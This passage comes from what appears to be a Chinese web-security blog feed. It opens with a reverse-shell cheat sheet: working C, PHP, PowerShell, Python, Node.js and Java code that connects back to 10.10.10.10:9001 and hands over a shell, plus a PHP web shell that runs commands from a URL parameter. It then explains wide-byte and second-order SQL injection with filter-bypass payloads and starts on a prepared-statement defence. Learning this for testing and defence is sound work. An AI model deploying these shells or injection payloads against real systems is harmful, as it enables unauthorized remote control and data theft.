aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>C Windows</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;winsock2.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">comment</span><span class="token punctuation">(</span>lib<span class="token punctuation">,</span></span><span class="token string">"ws2_32"</span><span class="token expression"><span class="token punctuation">)</span></span></span>WSADATA wsaData<span class="token punctuation">;</span>SOCKET Winsock<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> hax<span class="token punctuation">;</span> <span class="token keyword">char</span> ip_addr<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"10.10.10.10"</span><span class="token punctuation">;</span> <span class="token keyword">char</span> port<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"9001"</span><span class="token punctuation">;</span>            STARTUPINFO ini_processo<span class="token punctuation">;</span>PROCESS_INFORMATION processo_info<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">WSAStartup</span><span class="token punctuation">(</span><span class="token function">MAKEWORD</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>wsaData<span class="token punctuation">)</span><span class="token punctuation">;</span>    Winsock <span class="token operator">=</span> <span class="token function">WSASocket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> IPPROTO_TCP<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">hostent</span> <span class="token operator">*</span>host<span class="token punctuation">;</span>     host <span class="token operator">=</span> <span class="token function">gethostbyname</span><span class="token punctuation">(</span>ip_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcpy_s</span><span class="token punctuation">(</span>ip_addr<span class="token punctuation">,</span> <span class="token function">inet_ntoa</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">in_addr</span> <span class="token operator">*</span><span class="token punctuation">)</span>host<span class="token operator">-&gt;</span>h_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    hax<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>    hax<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span><span class="token function">atoi</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    hax<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> <span class="token function">inet_addr</span><span class="token punctuation">(</span>ip_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">WSAConnect</span><span class="token punctuation">(</span>Winsock<span class="token punctuation">,</span> <span class="token punctuation">(</span>SOCKADDR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>hax<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>hax<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ini_processo<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>ini_processo<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ini_processo<span class="token punctuation">.</span>cb <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>ini_processo<span class="token punctuation">)</span><span class="token punctuation">;</span>    ini_processo<span class="token punctuation">.</span>dwFlags <span class="token operator">=</span> STARTF_USESTDHANDLES <span class="token operator">|</span> STARTF_USESHOWWINDOW<span class="token punctuation">;</span>     ini_processo<span class="token punctuation">.</span>hStdInput <span class="token operator">=</span> ini_processo<span class="token punctuation">.</span>hStdOutput <span class="token operator">=</span> ini_processo<span class="token punctuation">.</span>hStdError <span class="token operator">=</span> <span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span>Winsock<span class="token punctuation">;</span>    TCHAR cmd<span class="token punctuation">[</span><span class="token number">255</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">TEXT</span><span class="token punctuation">(</span><span class="token string">"cmd.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CreateProcess</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> cmd<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> TRUE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>ini_processo<span class="token punctuation">,</span> <span class="token operator">&amp;</span>processo_info<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>php cmd</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TEXT<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>cmd<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>cmd<span class="token punctuation">"</span></span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>80<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>SUBMIT<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Execute<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>php exec</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">php -r <span class="token string">'$sock=fsockopen("10.10.10.10",9001);exec("sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>php system</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">php -r <span class="token string">'$sock=fsockopen("10.10.10.10",9001);system("sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>php poen</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">php -r <span class="token string">'$sock=fsockopen("10.10.10.10",9001);popen("sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3", "r");'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>powershell</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">powershell <span class="token operator">-</span>NoP <span class="token operator">-</span>NonI <span class="token operator">-</span>W Hidden <span class="token operator">-</span>Exec Bypass <span class="token operator">-</span>Command <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Sockets<span class="token punctuation">.</span>TCPClient<span class="token punctuation">(</span><span class="token string">"10.10.10.10"</span><span class="token punctuation">,</span>9001<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stream</span> = <span class="token variable">$client</span><span class="token punctuation">.</span>GetStream<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token namespace">[byte[]]</span><span class="token variable">$bytes</span> = 0<span class="token punctuation">.</span><span class="token punctuation">.</span>65535<span class="token punctuation">|</span><span class="token operator">%</span><span class="token punctuation">{</span>0<span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$i</span> = <span class="token variable">$stream</span><span class="token punctuation">.</span>Read<span class="token punctuation">(</span><span class="token variable">$bytes</span><span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token variable">$bytes</span><span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-ne</span> 0<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">;</span><span class="token variable">$data</span> = <span class="token punctuation">(</span><span class="token function">New-Object</span> <span class="token operator">-</span>TypeName System<span class="token punctuation">.</span>Text<span class="token punctuation">.</span>ASCIIEncoding<span class="token punctuation">)</span><span class="token punctuation">.</span>GetString<span class="token punctuation">(</span><span class="token variable">$bytes</span><span class="token punctuation">,</span>0<span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sendback</span> = <span class="token punctuation">(</span><span class="token function">iex</span> <span class="token variable">$data</span> 2&gt;&amp;1 <span class="token punctuation">|</span> <span class="token function">Out-String</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sendback2</span>  = <span class="token variable">$sendback</span> <span class="token operator">+</span> <span class="token string">"PS "</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token function">pwd</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Path <span class="token operator">+</span> <span class="token string">"&gt; "</span><span class="token punctuation">;</span><span class="token variable">$sendbyte</span> = <span class="token punctuation">(</span><span class="token namespace">[text.encoding]</span>::ASCII<span class="token punctuation">)</span><span class="token punctuation">.</span>GetBytes<span class="token punctuation">(</span><span class="token variable">$sendback2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stream</span><span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token variable">$sendbyte</span><span class="token punctuation">,</span>0<span class="token punctuation">,</span><span class="token variable">$sendbyte</span><span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stream</span><span class="token punctuation">.</span>Flush<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token variable">$client</span><span class="token punctuation">.</span>Close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>python</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">RHOST</span><span class="token operator">=</span><span class="token string">"10.10.10.10"</span><span class="token punctuation">;</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">RPORT</span><span class="token operator">=</span><span class="token number">9001</span><span class="token punctuation">;</span>python -c <span class="token string">'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>python3 windows</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token punctuation">,</span>socket<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>threading<span class="token punctuation">;</span><span class="token keyword">def</span> <span class="token function">s2p</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>            p<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>            p<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">p2s</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"10.10.10.10"</span><span class="token punctuation">,</span><span class="token number">9001</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"sh"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span> stdin<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span>s2p_thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>s2p<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">[</span>s<span class="token punctuation">,</span> p<span class="token punctuation">]</span><span class="token punctuation">)</span>s2p_thread<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>s2p_thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>p2s_thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>p2s<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">[</span>s<span class="token punctuation">,</span> p<span class="token punctuation">]</span><span class="token punctuation">)</span>p2s_thread<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>p2s_thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>node.js</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'nc -e sh 10.10.10.10 9001'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>java</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> shell <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">Process</span> p<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            p <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/10.10.10.10/9001 0&gt;&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            p<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            p<span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="/2024/11/21/web-an-quan/sql-zhu-ru/"/>
      <url>/2024/11/21/web-an-quan/sql-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h2 id="1-类型"><a href="#1-类型" class="headerlink" title="1.类型"></a>1.类型</h2><h3 id="1-1宽字节注入"><a href="#1-1宽字节注入" class="headerlink" title="1.1宽字节注入"></a>1.1宽字节注入</h3><p>####1.1.1原理</p><p>首先，一个字节为窄字节，两个字节为宽字节。</p><p>由于<code>php</code>开启了<code>magicqoutes</code>魔法函数，会将用户输入的特殊字符（包括单引号，双引号，空格等）前面加一个反斜杠来进行转义，</p><p><code>mysql</code>的编码方式为<code>GBK</code>，众所周知这是一个中文编码方式，它会将第一个字节的<code>ascll</code>码大于128的两个字节解释为一个汉字，反斜杠的<code>url</code>编码是<code>%5c</code>，所以我们在特殊字符被转义的情况下进行注入的话，就可以在闭合符前面加上<code>%df</code>等<code>ascll</code>码大于128的一个字节，这样<code>mysql</code>就会将<code>%df%5c</code>认为是一个汉字，后面的闭合符就会正常执行，从而绕过<code>php</code>的转义机制。</p><p><code>url?id=1%df' union select .......</code></p><h4 id="1-1-2防御措施"><a href="#1-1-2防御措施" class="headerlink" title="1.1.2防御措施"></a>1.1.2防御措施</h4><p><code>mysql</code>在接收到用户输入后，先调用<code>mysql_set_charset</code>函数设置连接使用的字符集为<code>gbk</code>，再调用<code>mysql_real_escape_string</code>函数对用户输入直接进行转义（该函数比<code>addslashes</code>函数更安全），该函数不会在闭合符前面添加反斜杠来进行转义，而是会把<code>%df加闭合符</code>直接编码为一个汉字，这样用户输入的闭合符就消失了。</p><h3 id="1-2二次注入"><a href="#1-2二次注入" class="headerlink" title="1.2二次注入"></a>1.2二次注入</h3><p>顾名思义，即利用第一次攻击者构造的sql数据在第二次sql语句执行中造成注入。</p><p>二次注入的根源在于，开发者信任数据库中取出的数据是无害的，sql语句在调用数据库中的数据时发生了注入。</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">insert into wp_user values(2,'admin\' or \'1','some_pass'); #插入username为admin' or '1，password为some_pass的数据此时数据库中有两条数据id    |   username    |  password1         admin           passwd2        admin'or '1     some_pass<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$res</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"select username from wp_user where id=2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$res</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"select password from wp_user where username='<span class="token interpolation"><span class="token variable">$name</span></span>'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>则最后执行的sql语句为</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select password from wp_user where username='admin' or '1';则返回的是passwd，而不是some_pass<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="2-绕过方式"><a href="#2-绕过方式" class="headerlink" title="2.绕过方式"></a>2.绕过方式</h2><p>大小写绕过、双写绕过、%09空格绕过、注释绕过、反斜杠绕过。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//过滤对应的绕过方式</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//过滤空格，将空格用%09代替</span><span class="token string double-quoted-string">"\bselect\b"</span>   <span class="token comment">//正则匹配关键字，用/*!50000select*/注释绕过,意为mysql5.0以上版本会执行注释里的sql语句。</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select * from wp_news where id='可控1' and title='可控2'"</span><span class="token punctuation">;</span>  <span class="token comment">//若替换了引号，则利用反斜杠将引号转义</span>绕过：可控<span class="token number">1</span><span class="token operator">=</span>a\  可控<span class="token number">2</span><span class="token operator">=</span><span class="token keyword">or</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment"># ===&gt;$sql="select * from wp_news where id='a\' and title=' or sleep(1)#'"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>若对单引号进行了转义，可以使用宽字节注入(在单双引号前面加%df)，或者使用<code>addslashed</code>函数对输入的字符串进行编码，这样其中的特殊字符就不会被转义。</p><p>##3.防御</p><h3 id="3-1-sql语句预编译"><a href="#3-1-sql语句预编译" class="headerlink" title="3.1 sql语句预编译"></a>3.1 sql语句预编译</h3><h4 id="3-1-1-php预编译"><a href="#3-1-1-php预编译" class="headerlink" title="3.1.1 php预编译"></a>3.1.1 php预编译</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// 创建 MySQLi 连接</span><span class="token variable">$mysqli</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"username"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"password"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"database_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 检查连接</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token operator">-&gt;</span><span class="token property">connect_error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Connection failed: "</span> <span class="token operator">.</span> <span class="token variable">$mysqli</span><span class="token operator">-&gt;</span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">// 预编译查询语句</span><span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE username = ? AND age = ?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 绑定参数：'s' 表示字符串类型，'i' 表示整数类型</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'john_doe'</span><span class="token punctuation">;</span><span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">25</span><span class="token punctuation">;</span><span class="token variable">$stmt</span><span class="token operator">-&gt;</span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"si"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 执行查询</span><span class="token variable">$stmt</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 获取查询结果</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-&gt;</span><span class="token function">get_result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 输出结果</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-&gt;</span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" - "</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string 